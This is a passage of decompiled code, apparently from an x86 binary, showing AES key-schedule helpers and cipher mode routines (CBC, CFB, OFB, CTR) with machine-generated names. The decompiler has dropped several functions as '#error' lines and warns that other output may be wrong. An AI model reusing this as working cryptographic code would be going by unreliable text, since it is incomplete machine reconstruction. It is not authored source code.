           _mm_load_si128(v10));
}

//----- (00412100) --------------------------------------------------------
#error "4121E8: call analysis failed (funcsize=77)"

//----- (00412280) --------------------------------------------------------
__m128i __usercall sub_412280@<xmm0>(__m128i a1@<xmm6>, __m128i a2@<xmm7>)
{
  return _mm_xor_si128(_mm_xor_si128(a1, _mm_shuffle_epi32(a1, 128)), _mm_shuffle_epi32(a2, 254));
}

//----- (004122A0) --------------------------------------------------------
int __cdecl sub_4122A0(int a1, __m128i a2)
{
  __m128i v2; // xmm2

  v2 = _mm_load_si128(&a2);
  a2 = _mm_alignr_epi8(v2, v2, 15);
  return sub_4122CB(a1, a2.m128i_i32[0], a2.m128i_i32[1], a2.m128i_i32[2], a2.m128i_i32[3]);
}
// 4122CB: using guessed type int __cdecl sub_4122CB(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (004122CB) --------------------------------------------------------
__m128i __usercall sub_4122CB@<xmm0>(const __m128i *a1@<ebp>, __m128i a2@<xmm0>, __m128i a3@<xmm7>)
{
  __m128i v3; // xmm1
  __m128i v4; // xmm7
  __m128i si128; // xmm4
  __m128i v6; // xmm5
  __m128i v7; // xmm1
  __m128i v8; // xmm0
  __m128i v9; // xmm2
  __m128i v10; // xmm0

  v3 = _mm_xor_si128(_mm_slli_si128(a3, 4), a3);
  v4 = _mm_xor_si128(_mm_xor_si128(_mm_slli_si128(v3, 8), v3), a1[21]);
  si128 = _mm_load_si128(a1 - 1);
  v6 = _mm_load_si128(a1 - 3);
  v7 = _mm_srli_epi32(_mm_andnot_si128(si128, a2), 4u);
  v8 = _mm_and_si128(a2, si128);
  v9 = _mm_shuffle_epi8(_mm_load_si128(a1 - 2), v8);
  v10 = _mm_xor_si128(v8, v7);
  return _mm_xor_si128(
           _mm_xor_si128(
             _mm_shuffle_epi8(
               _mm_load_si128(a1 + 3),
               _mm_xor_si128(_mm_shuffle_epi8(v6, _mm_xor_si128(_mm_shuffle_epi8(v6, v10), v9)), v7)),
             _mm_shuffle_epi8(
               _mm_load_si128(a1 + 2),
               _mm_xor_si128(_mm_shuffle_epi8(v6, _mm_xor_si128(_mm_shuffle_epi8(v6, v7), v9)), v10))),
           v4);
}

//----- (00412370) --------------------------------------------------------
__m128i __usercall sub_412370@<xmm0>(const __m128i *a1@<ebx>, int a2@<ebp>, __m128i a3@<xmm0>)
{
  __m128i si128; // xmm2

  si128 = _mm_load_si128((const __m128i *)(a2 - 16));
  return _mm_xor_si128(
           _mm_shuffle_epi8(_mm_load_si128(a1 + 1), _mm_srli_epi32(_mm_andnot_si128(si128, a3), 4u)),
           _mm_shuffle_epi8(_mm_load_si128(a1), _mm_and_si128(a3, si128)));
}

//----- (004123A0) --------------------------------------------------------
void __usercall sub_4123A0(__m128i *a1@<edx>, int a2@<ecx>, const __m128i *a3@<ebp>, int a4@<edi>, __m128i a5@<xmm0>)
{
  __m128i si128; // xmm5
  __m128i *v6; // edx
  __m128i v7; // xmm3
  __m128i v8; // xmm4
  __m128i v9; // xmm3
  __m128i v10; // xmm2
  __m128i v11; // xmm1
  __m128i v12; // xmm4

  si128 = _mm_load_si128(a3 + 8);
  if ( a4 )
  {
    v10 = _mm_load_si128(a3 - 1);
    v11 = _mm_srli_epi32(_mm_andnot_si128(v10, a5), 4u);
    v12 = _mm_and_si128(a5, v10);
    v9 = _mm_xor_si128(
           _mm_shuffle_epi8(_mm_load_si128(a3 + 33), v11),
           _mm_xor_si128(
             _mm_shuffle_epi8(_mm_load_si128(a3 + 32), v12),
             _mm_shuffle_epi8(
               _mm_xor_si128(
                 _mm_shuffle_epi8(_mm_load_si128(a3 + 31), v11),
                 _mm_xor_si128(
                   _mm_shuffle_epi8(_mm_load_si128(a3 + 30), v12),
                   _mm_shuffle_epi8(
                     _mm_xor_si128(
                       _mm_shuffle_epi8(_mm_load_si128(a3 + 29), v11),
                       _mm_xor_si128(
                         _mm_shuffle_epi8(_mm_load_si128(a3 + 28), v12),
                         _mm_shuffle_epi8(
                           _mm_xor_si128(
                             _mm_shuffle_epi8(_mm_load_si128(a3 + 27), v11),
                             _mm_shuffle_epi8(_mm_load_si128(a3 + 26), v12)),
                           si128))),
                     si128))),
               si128)));
    v6 = a1 - 1;
  }
  else
  {
    v6 = a1 + 1;
    v7 = _mm_shuffle_epi8(_mm_xor_si128(a5, a3[21]), si128);
    v8 = _mm_shuffle_epi8(v7, si128);
    v9 = _mm_xor_si128(_mm_xor_si128(v7, v8), _mm_shuffle_epi8(v8, si128));
  }
  *v6 = _mm_shuffle_epi8(v9, _mm_load_si128((const __m128i *)((char *)a3 + a2 + 256)));
}

//----- (004124A0) --------------------------------------------------------
#error "4124DB: call analysis failed (funcsize=26)"

//----- (004124F0) --------------------------------------------------------
#error "412537: call analysis failed (funcsize=31)"

//----- (00412550) --------------------------------------------------------
void __usercall sub_412550(__m128i a1@<xmm6>, __m128i a2@<xmm7>, const __m128i *a3, __m128i *a4, const __m128i *a5)
{
  sub_411E40();
  *a4 = sub_411E50(a5, (const __m128i *)0xFFFFF591, _mm_loadu_si128(a3), a1, a2);
}

//----- (00412590) --------------------------------------------------------
void __usercall sub_412590(__m128i a1@<xmm6>, __m128i a2@<xmm7>, const __m128i *a3, __m128i *a4, const __m128i *a5)
{
  sub_411E40();
  *a4 = sub_411F90(a5, (const __m128i *)0xFFFFF551, _mm_loadu_si128(a3), a1, a2);
}

//----- (004125D0) --------------------------------------------------------
// local variable allocation has failed, the output may be wrong!
void __usercall sub_4125D0(
        __m128i a1@<xmm6>,
        __m128i a2@<xmm7>,
        const __m128i *a3,
        int a4,
        unsigned int a5,
        __m128i a6,
        int *a7)
{
  const __m128i *v7; // esi
  __m128i v8; // xmm1
  unsigned int v9; // edi
  const __m128i *v10; // edx
  int v11; // ecx
  __m128i v12; // xmm0
  bool v13; // cf
  __m128i v14; // xmm0
  int v15; // [esp+38h] [ebp-10h] BYREF
  __int64 v16; // [esp+3Ch] [ebp-Ch]
  int retaddr; // [esp+48h] [ebp+0h] OVERLAPPED

  v7 = a3;
  if ( a5 >= 0x10 )
  {
    v8 = _mm_loadu_si128((const __m128i *)a6.m128i_i32[1]);
    a7 = &v15;
    v15 = a4 - (_DWORD)a3;
    v16 = a6.m128i_i64[0];
    v9 = a5 - 16;
    sub_411E40();
    if ( v11 )
    {
      do
      {
        v12 = sub_411E50(v10, (const __m128i *)0xFFFFF4CF, _mm_xor_si128(_mm_loadu_si128(v7), v8), a1, a2);
        v10 = (const __m128i *)v16;
        v8 = v12;
        *(__m128i *)((char *)v7++ + v15) = v12;
        v13 = v9 < 0x10;
        v9 -= 16;
      }
      while ( !v13 );
    }
    else
    {
      do
      {
        *(__m128i *)&retaddr = v8;
        a6 = _mm_loadu_si128(v7);
        v14 = sub_411F90(v10, (const __m128i *)0xFFFFF4CF, a6, a1, a2);
        v10 = (const __m128i *)v16;
        v8 = _mm_load_si128(&a6);
        *(const __m128i *)((char *)v7++ + v15) = _mm_xor_si128(v14, *(__m128i *)&retaddr);
        v13 = v9 < 0x10;
        v9 -= 16;
      }
      while ( !v13 );
    }
    *(_OWORD *)HIDWORD(v16) = v8;
  }
}
// 4125D0: variables would overlap: ^48.4(retaddr) and ^48.16

//----- (004126B0) --------------------------------------------------------
_DWORD *__cdecl sub_4126B0(
        char *a1,
        char *a2,
        unsigned int a3,
        int a4,
        _DWORD *a5,
        void (__cdecl *a6)(char *, char *, int))
{
  _DWORD *result; // eax
  unsigned int v7; // ebx
  char *v10; // ebp
  char *v11; // ebp
  _DWORD *v12; // eax
  int v13; // edx
  int v14; // ebx
  bool v15; // zf
  int v16; // edx
  unsigned int v17; // eax
  char v18; // cl
  char *v19; // ebp
  char *v20; // ecx
  unsigned int v21; // edx
  unsigned int v22; // [esp+10h] [ebp-14h]

  result = a5;
  v7 = a3;
  v10 = (char *)a5;
  if ( a3 >= 0x10 )
  {
    v22 = a3 >> 4;
    do
    {
      v11 = (char *)(v10 - a1);
      v12 = a1;
      v13 = 4;
      do
      {
        v14 = *v12 ^ *(_DWORD *)&v11[(_DWORD)v12];
        ++v12;
        --v13;
        *(_DWORD *)((char *)v12 + a2 - a1 - 4) = v14;
      }
      while ( v13 );
      a6(a2, a2, a4);
      v10 = a2;
      v7 = a3 - 16;
      a1 += 16;
      a2 += 16;
      v15 = v22-- == 1;
      a3 -= 16;
    }
    while ( !v15 );
    result = a5;
  }
  if ( v7 )
  {
    do
    {
      v16 = v10 - a1;
      v17 = 0;
      while ( v17 < v7 )
      {
        a2[v17] = a1[v17] ^ a1[v17 + v16];
        v7 = a3;
        if ( v17 + 1 >= a3 )
        {
          ++v17;
          break;
        }
        a2[v17 + 1] = a1[v17 + 1] ^ v10[v17 + 1];
        if ( v17 + 2 >= a3 )
        {
          v17 += 2;
          break;
        }
        a2[v17 + 2] = v10[v17 + 2] ^ a1[v17 + 2];
        if ( v17 + 3 >= a3 )
        {
          v17 += 3;
          break;
        }
        v18 = a1[v17 + 3] ^ v10[v17 + 3];
        v17 += 4;
        a2[v17 - 1] = v18;
        if ( v17 >= 0x10 )
          goto LABEL_22;
        v16 = v10 - a1;
      }
      if ( v17 < 0x10 )
      {
        v19 = (char *)(v10 - a2);
        v20 = &a2[v17];
        v21 = 16 - v17;
        do
        {
          *v20 = v19[(_DWORD)v20];
          ++v20;
          --v21;
        }
        while ( v21 );
      }
LABEL_22:
      a6(a2, a2, a4);
      v10 = a2;
      if ( v7 <= 0x10 )
        break;
      v7 -= 16;
      a1 += 16;
      a2 += 16;
      a3 = v7;
    }
    while ( v7 );
    result = a5;
  }
  *result = *(_DWORD *)v10;
  result[1] = *((_DWORD *)v10 + 1);
  result[2] = *((_DWORD *)v10 + 2);
  result[3] = *((_DWORD *)v10 + 3);
  return result;
}

//----- (00412850) --------------------------------------------------------
char __cdecl sub_412850(char *a1, char *a2, unsigned int a3, int a4, char *a5, void (__cdecl *a6)(char *, int *, int))
{
  unsigned int v6; // eax
  unsigned int v7; // ebx
  char *v8; // ebp
  char *v9; // edi
  int v10; // eax
  int v11; // ecx
  int v12; // eax
  int v13; // edx
  int v14; // eax
  int v15; // ecx
  bool v16; // zf
  char *v17; // ecx
  char v18; // dl
  int v19; // ebp
  char *v20; // ecx
  int v21; // edx
  char v23; // [esp+13h] [ebp-39h]
  char v24; // [esp+13h] [ebp-39h]
  char v25; // [esp+13h] [ebp-39h]
  unsigned int v26; // [esp+14h] [ebp-38h]
  unsigned int v27; // [esp+14h] [ebp-38h]
  int v28; // [esp+14h] [ebp-38h]
  char *v29; // [esp+18h] [ebp-34h]
  char *v30; // [esp+18h] [ebp-34h]
  int v31; // [esp+20h] [ebp-2Ch]
  int v32; // [esp+28h] [ebp-24h]
  int v33[4]; // [esp+38h] [ebp-14h] BYREF

  LOBYTE(v6) = a4;
  v7 = a3;
  v8 = a1;
  v9 = a2;
  if ( a1 == a2 )
  {
    if ( a3 >= 0x10 )
    {
      v27 = a3 >> 4;
      do
      {
        a6(v8, v33, a4);
        v10 = *(_DWORD *)v8;
        *(_DWORD *)v9 = v33[0] ^ *(_DWORD *)a5;
        v11 = v33[1] ^ *((_DWORD *)a5 + 1);
        *(_DWORD *)a5 = v10;
        v12 = *((_DWORD *)v8 + 1);
        *((_DWORD *)v9 + 1) = v11;
        v13 = v33[2] ^ *((_DWORD *)a5 + 2);
        *((_DWORD *)a5 + 1) = v12;
        v14 = *((_DWORD *)v8 + 2);
        *((_DWORD *)v9 + 2) = v13;
        v15 = v33[3] ^ *((_DWORD *)a5 + 3);
        *((_DWORD *)a5 + 2) = v14;
        v6 = *((_DWORD *)v8 + 3);
        *((_DWORD *)v9 + 3) = v15;
        v7 -= 16;
        v8 += 16;
        v9 += 16;
        v16 = v27-- == 1;
        *((_DWORD *)a5 + 3) = v6;
      }
      while ( !v16 );
    }
  }
  else
  {
    v6 = (unsigned int)a5;
    v29 = a5;
    if ( a3 >= 0x10 )
    {
      v26 = a3 >> 4;
      do
      {
        a6(v8, (int *)v9, a4);
        *(_DWORD *)v9 ^= *(_DWORD *)v29;
        *((_DWORD *)v9 + 1) ^= *((_DWORD *)v29 + 1);
        *((_DWORD *)v9 + 2) ^= *((_DWORD *)v29 + 2);
        *((_DWORD *)v9 + 3) ^= *((_DWORD *)v29 + 3);
        v29 = v8;
        v7 -= 16;
        v8 += 16;
        v9 += 16;
        --v26;
      }
      while ( v26 );
      v6 = (unsigned int)v29;
    }
    *(_DWORD *)a5 = *(_DWORD *)v6;
    *((_DWORD *)a5 + 1) = *(_DWORD *)(v6 + 4);
    *((_DWORD *)a5 + 2) = *(_DWORD *)(v6 + 8);
    *((_DWORD *)a5 + 3) = *(_DWORD *)(v6 + 12);
  }
  if ( v7 )
  {
    v32 = a5 - (char *)v33;
    v30 = v9 + 2;
    v28 = v9 - (char *)v33;
    v31 = v8 - (char *)v33;
    while ( 1 )
    {
      a6(v8, v33, a4);
      v6 = 0;
      while ( v6 < v7 )
      {
        v17 = (char *)v33 + v6;
        v23 = *((_BYTE *)v33 + v6 + v31);
        v17[v28] = v17[v32] ^ *v17;
        v17[v32] = v23;
        if ( (unsigned int)v33 + v6 + 1 - (_DWORD)v33 >= v7 )
        {
          ++v6;
          break;
        }
        v24 = v8[v6 + 1];
        v30[v6 - 1] = a5[v6 + 1] ^ v17[1];
        a5[v6 + 1] = v24;
        if ( (unsigned int)&v17[2 - (_DWORD)v33] >= v7 )
        {
          v6 += 2;
          break;
        }
        v25 = v8[v6 + 2];
        v30[v6] = a5[v6 + 2] ^ v17[2];
        a5[v6 + 2] = v25;
        if ( (unsigned int)&v17[3 - (_DWORD)v33] >= v7 )
        {
          v6 += 3;
          break;
        }
        v18 = v8[v6 + 3];
        v30[v6 + 1] = a5[v6 + 3] ^ v17[3];
        a5[v6 + 3] = v18;
        v6 += 4;
        if ( v6 >= 0x10 )
          break;
      }
      if ( v7 <= 0x10 )
        break;
      v31 += 16;
      v28 += 16;
      v30 += 16;
      v7 -= 16;
      v8 += 16;
      if ( !v7 )
        return v6;
    }
    if ( v6 < 0x10 )
    {
      v19 = v8 - a5;
      v20 = &a5[v6];
      v21 = 16 - v6;
      do
      {
        LOBYTE(v6) = v20[v19];
        *v20++ = v6;
        --v21;
      }
      while ( v21 );
    }
  }
  return v6;
}

//----- (00412AF0) --------------------------------------------------------
unsigned int *__cdecl sub_412AF0(
        _BYTE *a1,
        _BYTE *a2,
        unsigned int a3,
        int a4,
        int a5,
        unsigned int *a6,
        int (__cdecl *a7)(int, int, int))
{
  unsigned int *result; // eax
  unsigned int i; // esi
  int v10; // eax
  _BYTE *v11; // ebp
  unsigned int v12; // ecx
  int v13; // edx
  _BYTE *v14; // eax
  unsigned int v15; // esi
  unsigned int v16; // [esp+10h] [ebp-4h]
  _BYTE *v17; // [esp+20h] [ebp+Ch]

  result = a6;
  for ( i = *a6; i; ++a1 )
  {
    if ( !a3 )
      break;
    *a2 = *a1 ^ *(_BYTE *)(i + a5);
    result = (unsigned int *)(a2 + 1);
    --a3;
    i = ((_BYTE)i + 1) & 0xF;
    ++a2;
  }
  if ( a3 >= 0x10 )
  {
    v17 = &a1[-a5];
    v16 = a3 >> 4;
    v10 = 16 * (a3 >> 4);
    v11 = &a2[-a5];
    a2 += v10;
    a1 += v10;
    do
    {
      result = (unsigned int *)a7(a5, a5, a4);
      if ( i < 0x10 )
      {
        result = (unsigned int *)(i + a5);
        v12 = ((15 - i) >> 2) + 1;
        do
        {
          v13 = *result ^ *(unsigned int *)((char *)result + (_DWORD)v17);
          ++result;
          --v12;
          *(_DWORD *)&v11[(_DWORD)result - 4] = v13;
        }
        while ( v12 );
      }
      v17 += 16;
      a3 -= 16;
      v11 += 16;
      i = 0;
      --v16;
    }
    while ( v16 );
  }
  if ( a3 )
  {
    a7(a5, a5, a4);
    v14 = (_BYTE *)(i + a5);
    v15 = a3 + i;
    do
    {
      --a3;
      a2[(_DWORD)v14 - a5] = *v14 ^ a1[(_DWORD)v14 - a5];
      ++v14;
    }
    while ( a3 );
    result = a6;
    *a6 = v15;
  }
  else
  {
    *a6 = i;
  }
  return result;
}

//----- (00412C00) --------------------------------------------------------
unsigned int *__cdecl sub_412C00(
        _BYTE *a1,
        _BYTE *a2,
        unsigned int a3,
        int a4,
        int a5,
        unsigned int *a6,
        int a7,
        void (__cdecl *a8)(int, int, int))
{
  unsigned int v8; // esi
  unsigned int i; // ebx
  int v10; // eax
  _BYTE *v11; // ebp
  _DWORD *v12; // eax
  unsigned int v13; // ecx
  _BYTE *v14; // eax
  unsigned int v15; // esi
  unsigned int *result; // eax
  unsigned int v17; // ebp
  _BYTE *v18; // ebx
  char v19; // al
  int v20; // ebx
  _DWORD *v21; // eax
  unsigned int v22; // ecx
  int v23; // esi
  bool v24; // zf
  int v25; // ebx
  _BYTE *v26; // ecx
  _BYTE *v27; // eax
  _BYTE *v28; // edi
  char v29; // cl
  unsigned int v30; // [esp+10h] [ebp-4h]
  unsigned int v31; // [esp+10h] [ebp-4h]
  _BYTE *v32; // [esp+30h] [ebp+1Ch]
  _BYTE *v33; // [esp+30h] [ebp+1Ch]

  v8 = *a6;
  if ( !a7 )
  {
    v17 = a3;
    v18 = a1;
    if ( v8 )
    {
      do
      {
        if ( !v17 )
          break;
        v19 = *v18;
        *a2 = *v18 ^ *(_BYTE *)(v8 + a5);
        *(_BYTE *)(v8 + a5) = v19;
        ++v18;
        --v17;
        v8 = ((_BYTE)v8 + 1) & 0xF;
        ++a2;
      }
      while ( v8 );
      a1 = v18;
      a3 = v17;
    }
    if ( v17 >= 0x10 )
    {
      v33 = &a2[-a5];
      v31 = v17 >> 4;
      do
      {
        a8(a5, a5, a4);
        if ( v8 < 0x10 )
        {
          v20 = v18 - a2;
          v21 = (_DWORD *)(v8 + a5);
          v22 = ((15 - v8) >> 2) + 1;
          do
          {
            v23 = *(_DWORD *)&v33[(_DWORD)v21 + v20];
            *(_DWORD *)&v33[(_DWORD)v21] = v23 ^ *v21;
            *v21++ = v23;
            --v22;
          }
          while ( v22 );
          v17 = a3;
          v18 = a1;
        }
        a2 += 16;
        v33 += 16;
        v17 -= 16;
        v18 += 16;
        v8 = 0;
        v24 = v31-- == 1;
        a3 = v17;
        a1 = v18;
      }
      while ( !v24 );
    }
    if ( v17 )
    {
      a8(a5, a5, a4);
      v25 = v18 - a2;
      v26 = &a2[-a5];
      v27 = (_BYTE *)(v8 + a5);
      v8 += v17;
      while ( 1 )
      {
        v28 = &v26[(_DWORD)v27];
        v29 = v26[(_DWORD)v27 + v25];
        *v28 = v29 ^ *v27;
        --v17;
        *v27++ = v29;
        if ( !v17 )
          break;
        v26 = &a2[-a5];
      }
    }
    goto LABEL_30;
  }
  for ( i = a3; v8; ++a1 )
  {
    if ( !i )
      break;
    *(_BYTE *)(v8 + a5) ^= *a1;
    *a2 = *(_BYTE *)(v8 + a5);
    --i;
    v8 = ((_BYTE)v8 + 1) & 0xF;
    ++a2;
  }
  if ( i >= 0x10 )
  {
    v32 = &a1[-a5];
    v30 = i >> 4;
    v10 = 16 * (i >> 4);
    v11 = &a2[-a5];
    a2 += v10;
    a1 += v10;
    do
    {
      a8(a5, a5, a4);
      if ( v8 < 0x10 )
      {
        v12 = (_DWORD *)(v8 + a5);
        v13 = ((15 - v8) >> 2) + 1;
        do
        {
          *v12 ^= *(_DWORD *)((char *)v12 + (_DWORD)v32);
          *(_DWORD *)&v11[(_DWORD)v12] = *v12;
          ++v12;
          --v13;
        }
        while ( v13 );
      }
      v32 += 16;
      i -= 16;
      v11 += 16;
      v8 = 0;
      --v30;
    }
    while ( v30 );
  }
  if ( !i )
  {
LABEL_30:
    result = a6;
    *a6 = v8;
    return result;
  }
  a8(a5, a5, a4);
  v14 = (_BYTE *)(v8 + a5);
  v15 = i + v8;
  do
  {
    *v14 ^= a1[(_DWORD)v14 - a5];
    --i;
    a2[(_DWORD)v14 - a5] = *v14;
    ++v14;
  }
  while ( i );
  result = a6;
  *a6 = v15;
  return result;
}

//----- (00412E30) --------------------------------------------------------
char __fastcall sub_412E30(void (__cdecl *a1)(int *, int *, int), _BYTE *a2, int a3, int a4, int a5, int *a6, int a7)
{
  char *v8; // eax
  int v9; // esi
  _BYTE *v10; // ecx
  char v11; // al
  int v12; // ebp
  int v13; // ebx
  int i; // edx
  char *v15; // ecx
  char v16; // al
  char v17; // dl
  int v18; // ecx
  int v19; // eax
  int v20; // ecx
  int v21; // edx
  int v22; // ecx
  int v23; // edx
  _BYTE *v24; // edi
  unsigned __int8 *v25; // esi
  int v26; // ebp
  char v27; // al
  char v28; // dl
  unsigned __int8 v29; // al
  unsigned __int8 v30; // dl
  char v32; // [esp+Fh] [ebp-31h]
  int v33; // [esp+10h] [ebp-30h]
  int v34; // [esp+18h] [ebp-28h] BYREF
  int v35[3]; // [esp+1Ch] [ebp-24h]
  char v36[20]; // [esp+28h] [ebp-18h] BYREF

  LOBYTE(v8) = a5;
  if ( (unsigned int)(a4 - 1) <= 0x7F )
  {
    v34 = *a6;
    v35[0] = a6[1];
    v35[1] = a6[2];
    v35[2] = a6[3];
    a1(a6, a6, a5);
    v9 = (a4 + 7) / 8;
    if ( a7 )
    {
      if ( v9 > 0 )
      {
        v10 = a2;
        do
        {
          v11 = *v10 ^ v10[(char *)a6 - a2];
          v10[v36 - a2] = v11;
          (v10++)[a3 - (_DWORD)a2] = v11;
          --v9;
        }
        while ( v9 );
      }
    }
    else
    {
      v12 = 0;
      if ( v9 > 0 )
      {
        v13 = a2 - v36;
        for ( i = (char *)a6 - v36; ; i = (char *)a6 - v36 )
        {
          v15 = &v36[v12];
          v16 = v36[v12 + v13];
          v17 = v16 ^ v36[v12 + i];
          *v15 = v16;
          ++v12;
          v15[a3 - (_DWORD)v36] = v17;
          if ( v12 >= v9 )
            break;
        }
      }
    }
    v18 = a4 % 8;
    v19 = a4 / 8;
    v33 = a4 % 8;
    if ( a4 % 8 )
    {
      v32 = 8 - v18;
      v24 = (char *)a6 + 1;
      v25 = (unsigned __int8 *)&v34 + v19 + 1;
      v26 = 4;
      do
      {
        v27 = *v25 << v33;
        *(v24 - 1) = (*v25 >> v32) | (*(v25 - 1) << v18);
        v28 = v25[1] << v33;
        *v24 = (v25[1] >> v32) | v27;
        v29 = v25[2];
        v24[1] = (v29 >> v32) | v28;
        v30 = v25[3];
        LOBYTE(v18) = a4 % 8;
        LOBYTE(v8) = v29 << v33;
        v25 += 4;
        v24 += 4;
        --v26;
        *(v24 - 2) = (unsigned __int8)v8 | (v30 >> v32);
      }
      while ( v26 );
    }
    else
    {
      v20 = *(int *)((char *)&v35[-1] + v19);
      v21 = *(int *)((char *)v35 + v19);
      v8 = (char *)&v35[-1] + v19;
      *a6 = v20;
      v22 = *((_DWORD *)v8 + 2);
      a6[1] = v21;
      v23 = *((_DWORD *)v8 + 3);
      a6[2] = v22;
      a6[3] = v23;
    }
  }
  return (char)v8;
}

//----- (00413000) --------------------------------------------------------
char __cdecl sub_413000(
        int a1,
        int a2,
        unsigned int a3,
        int a4,
        int *a5,
        int a6,
        int a7,
        void (__cdecl *a8)(int *, int *, int))
{
  unsigned int i; // ebp
  char v9; // bl
  unsigned int v10; // esi
  char result; // al
  char v12; // [esp+6h] [ebp-2h] BYREF
  char v13; // [esp+7h] [ebp-1h] BYREF

  for ( i = 0; i < a3; *(_BYTE *)(v10 + a2) = result | *(_BYTE *)(v10 + a2) & ~(1 << (7 - v9)) )
  {
    v9 = i & 7;
    v10 = i >> 3;
    v12 = ((unsigned __int8)(1 << (7 - (i & 7))) & *(_BYTE *)((i >> 3) + a1)) != 0 ? 0x80 : 0;
    sub_412E30(a8, &v12, (int)&v13, 1, a4, a5, a7);
    result = (unsigned __int8)(v13 & 0x80) >> (i++ & 7);
  }
  return result;
}

//----- (004130A0) --------------------------------------------------------
char __cdecl sub_4130A0(
        _BYTE *a1,
        int a2,
        int a3,
        int a4,
        int *a5,
        int a6,
        int a7,
        void (__cdecl *a8)(int *, int *, int))
{
  int v8; // ebx
  _BYTE *v9; // esi
  char result; // al

  v8 = a3;
  if ( a3 )
  {
    v9 = a1;
    do
    {
      result = sub_412E30(a8, v9, (int)&v9[a2 - (_DWORD)a1], 8, a4, a5, a7);
      ++v9;
      --v8;
    }
    while ( v8 );
  }
  return result;
}

//----- (004130F0) --------------------------------------------------------
int __fastcall sub_4130F0(int a1, int a2)
{
  int result; // eax
  int v3; // ecx
  int v4; // esi
  unsigned int v5; // ecx

  result = 16;
  v3 = 1;
  do
  {
    v4 = *(unsigned __int8 *)(result + a2 - 1);
    --result;
    v5 = v4 + v3;
    *(_BYTE *)(result + a2) = v5;
    v3 = v5 >> 8;
  }
  while ( result );
  return result;
}

//----- (00413120) --------------------------------------------------------
int *__cdecl sub_413120(
        _BYTE *a1,
        _BYTE *a2,
        unsigned int a3,
        int a4,
        int a5,
        _DWORD *a6,
        int *a7,
        void (__cdecl *a8)(int, _DWORD *, int))
{
  int *result; // eax
  int i; // ebx
  int v11; // eax
  _BYTE *v12; // ebx
  _BYTE *v13; // ebp
  int v14; // ecx
  int v15; // ecx
  int v16; // edx
  int v17; // ecx
  _BYTE *v18; // eax
  unsigned int v19; // ebx
  unsigned int v20; // [esp+10h] [ebp-4h]

  result = a7;
  for ( i = *a7; i; ++a1 )
  {
    if ( !a3 )
      break;
    *a2 = *a1 ^ *((_BYTE *)a6 + i);
    result = (int *)(a2 + 1);
    --a3;
    i = ((_BYTE)i + 1) & 0xF;
    ++a2;
  }
  if ( a3 >= 0x10 )
  {
    v20 = a3 >> 4;
    v11 = 16 * (a3 >> 4);
    v12 = (_BYTE *)(a2 - (_BYTE *)a6);
    v13 = (_BYTE *)(a1 - (_BYTE *)a6);
    a2 += v11;
    a1 += v11;
    do
    {
      a8(a5, a6, a4);
      sub_4130F0(v14, a5);
      result = a6;
      v15 = 4;
      do
      {
        v16 = *result ^ *(_DWORD *)&v13[(_DWORD)result];
        ++result;
        --v15;
        *(int *)((char *)result + (_DWORD)v12 - 4) = v16;
      }
      while ( v15 );
      a3 -= 16;
      v12 += 16;
      v13 += 16;
      --v20;
    }
    while ( v20 );
    i = 0;
  }
  if ( a3 )
  {
    a8(a5, a6, a4);
    sub_4130F0(v17, a5);
    v18 = (char *)a6 + i;
    v19 = a3 + i;
    do
    {
      --a3;
      v18[a2 - (_BYTE *)a6] = *v18 ^ v18[a1 - (_BYTE *)a6];
      ++v18;
    }
    while ( a3 );
    result = a7;
    *a7 = v19;
  }
  else
  {
    *a7 = i;
  }
  return result;
}
// 4131B6: variable 'v14' is possibly undefined
// 4131FF: variable 'v17' is possibly undefined

//----- (00413240) --------------------------------------------------------
int __fastcall sub_413240(int a1, int a2)
{
  int result; // eax
  int v3; // ecx
  int v4; // esi
  unsigned int v5; // ecx

  result = 12;
  v3 = 1;
  do
  {
    v4 = *(unsigned __int8 *)(result + a2 - 1);
    --result;
    v5 = v4 + v3;
    *(_BYTE *)(result + a2) = v5;
    v3 = v5 >> 8;
  }
  while ( result );
  return result;
}

//----- (00413270) --------------------------------------------------------
int __cdecl sub_413270(
        _BYTE *a1,
        _BYTE *a2,
        unsigned int a3,
        int a4,
        int a5,
        _DWORD *a6,
        int *a7,
        void (__cdecl *a8)(_DWORD *, _DWORD *, unsigned int, int, int))
{
  int result; // eax
  unsigned int v10; // esi
  unsigned int v11; // ebx
  int v12; // eax
  int v13; // ecx
  int v14; // edx
  unsigned int v15; // ecx
  int v16; // ebx
  int v17; // ecx
  _BYTE *v18; // eax
  int v19; // edi
  int i; // [esp+10h] [ebp-4h]

  result = *a7;
  for ( i = *a7; result; i = result )
  {
    if ( !a3 )
      break;
    *a2 = *a1 ^ *((_BYTE *)a6 + result);
    --a3;
    result = ((_BYTE)result + 1) & 0xF;
    ++a2;
    ++a1;
  }
  v10 = _byteswap_ulong(*(_DWORD *)(a5 + 12));
  if ( a3 >= 0x10 )
  {
    do
    {
      v11 = a3 >> 4;
      v10 += a3 >> 4;
      if ( v10 < a3 >> 4 )
      {
        v11 -= v10;
        v10 = 0;
      }
      a8(a1, a2, v11, a4, a5);
      *(_DWORD *)(a5 + 12) = _byteswap_ulong(v10);
      if ( !v10 )
      {
        v12 = 12;
        v13 = 1;
        do
        {
          v14 = *(unsigned __int8 *)(v12 + a5 - 1);
          --v12;
          v15 = v14 + v13;
          *(_BYTE *)(v12 + a5) = v15;
          v13 = v15 >> 8;
        }
        while ( v12 );
      }
      v16 = 16 * v11;
      a2 += v16;
      a1 += v16;
      a3 -= v16;
    }
    while ( a3 >= 0x10 );
    result = i;
  }
  if ( a3 )
  {
    *a6 = 0;
    a6[1] = 0;
    a6[2] = 0;
    a6[3] = 0;
    a8(a6, a6, 1u, a4, a5);
    *(_DWORD *)(a5 + 12) = _byteswap_ulong(v10 + 1);
    if ( v10 == -1 )
      sub_413240(v17, a5);
    v18 = (char *)a6 + i;
    v19 = a3 + i;
    do
    {
      --a3;
      v18[a2 - (_BYTE *)a6] = *v18 ^ v18[a1 - (_BYTE *)a6];
      ++v18;
    }
    while ( a3 );
    result = (int)a7;
    *a7 = v19;
  }
  else
  {
    *a7 = result;
  }
  return result;
}
// 41336A: variable 'v17' is possibly undefined

//----- (004133B0) --------------------------------------------------------
_DWORD *__cdecl sub_4133B0(_DWORD *a1, _DWORD *a2, _DWORD *a3)
{
  _DWORD *result; // eax

  if ( a1 )
    *a1 = off_531284;
  if ( a2 )
    *a2 = off_531288;
  result = a3;
  if ( a3 )
    *a3 = off_53128C;
  return result;
}
// 531284: using guessed type int (__cdecl *off_531284)(size_t Size);
// 531288: using guessed type int (__cdecl *off_531288)(void *Block, size_t Size, int, int);
// 53128C: using guessed type int (__cdecl *off_53128C)(void *Block);

//----- (004133F0) --------------------------------------------------------
